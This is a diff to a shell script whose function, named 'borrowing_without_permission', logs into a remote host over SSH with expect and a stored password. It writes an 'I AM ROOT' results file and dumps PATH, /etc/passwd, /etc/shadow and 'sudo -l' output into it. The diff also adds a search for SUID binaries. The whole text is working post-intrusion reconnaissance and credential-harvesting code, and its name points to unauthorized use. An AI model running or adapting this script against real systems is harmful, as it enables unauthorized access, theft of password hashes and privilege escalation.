@@ -181,56 +181,65 @@ SND="send \"echo '' >> $DIR${F}\r\""
 
 
 function borrowing_without_permission {
-        expect -c "\
-        set timeout 300
-        set env(TERM)
-        spawn ssh -t "$USERNAME\@$IP_ADDRESS"
-        sleep 1
-        expect_before \"*(yes/no*\" {
-        send \"yes\r\" 
-        send \"$PASSWD\r\"
-        }
-        sleep 2
-        expect \"*assword*\"
-        send \"$PASSWD\r\"
-        sleep 2
-        send \"mkdir ${DIR}\r\"
-        sleep 2
-        send \"touch $DIR/${F}\r\"
-        sleep 1
-        send \"echo -e 'I AM ROOT-RESULTS FOR ${IP_ADDRESS}' >> $DIR${F}\r\"
-        ${SND}
-        ${SND}
-        ${SND}
-        sleep 2
-        send \"echo '#################### $USERNAME PATH ####################' >> $DIR${F}\r\"
-        sleep 2
-        ${SND}
-        sleep 2
-        send \"echo $PATH >> $DIR$F\r\"
-        sleep 2
-        ${SND}
-        send \"echo '#################### /ETC/PASSWD ####################' >> $DIR${F}\r\"
-        ${SND}
-        send \"cat /etc/passwd >> $DIR$F\r\"
-        sleep 2
-        ${SND}
-        send \"echo '#################### /ETC/SHADOW ####################' >> $DIR${F}\r\"
-        ${SND}
-        sleep 2
-        send \"cat /etc/shadow >> $DIR${F}\r\"
-        sleep 2
-        send \"echo '#################### SUDO COMMANDS ####################' >> $DIR${F}\r\"
-        ${SND}
-        sleep 2
-        send \"sudo -l >> ${DIR}${F}\r\"
-        expect \"*assword*\"
-        send \"$PASSWD\r\"
-        sleep 2
-        ${SND}
-        sleep 2
-        send \"exit\r\"
-        "
+      expect -c "\
+      set timeout 300
+      set env(TERM)
+      spawn ssh -t "$USERNAME\@$IP_ADDRESS"
+      sleep 1
+      expect_before \"*(yes/no*\" {
+      send \"yes\r\" 
+      send \"$PASSWD\r\"
+      }
+      sleep 2
+      expect \"*assword*\"
+      send \"$PASSWD\r\"
+      sleep 2
+      send \"mkdir ${DIR}\r\"
+      sleep 2
+      send \"touch $DIR/${F}\r\"
+      sleep 1
+      send \"echo -e 'I AM ROOT-RESULTS FOR ${IP_ADDRESS}' >> $DIR${F}\r\"
+      ${SND}
+      ${SND}
+      ${SND}
+      sleep 2
+      send \"echo '#################### $USERNAME PATH ####################' >> $DIR${F}\r\"
+      sleep 2
+      ${SND}
+      sleep 2
+      send \"echo $PATH >> $DIR$F\r\"
+      sleep 2
+      ${SND}
+      send \"echo '#################### /ETC/PASSWD ####################' >> $DIR${F}\r\"
+      ${SND}
+      send \"cat /etc/passwd >> $DIR$F\r\"
+      sleep 2
+      ${SND}
+      send \"echo '#################### /ETC/SHADOW ####################' >> $DIR${F}\r\"
+      ${SND}
+      sleep 2
+      send \"cat /etc/shadow >> $DIR${F}\r\"
+      sleep 2
+      expect \"*assword*\"
+      send \"$PASSWD\r\"
+      ${SND}
+      send \"echo '#################### SUID FILES ####################' >> $DIR${F}\r\"
+      ${SND}
+      send \"find / -perm -u=s -type f >> $DIR${F}\r\"
+      expect \"*assword*\"
+      send \"$PASSWD\r\"
+      ${SND}
+      send \"echo '#################### SUDO COMMANDS ####################' >> $DIR${F}\r\"
+      ${SND}
+      sleep 2
+      send \"sudo -l >> ${DIR}${F}\r\"
+      expect \"*assword*\"
+      send \"$PASSWD\r\"
+      sleep 2
+      ${SND}
+      sleep 2
+      send \"exit\r\"
+      "
 }
 borrowing_without_permission
 
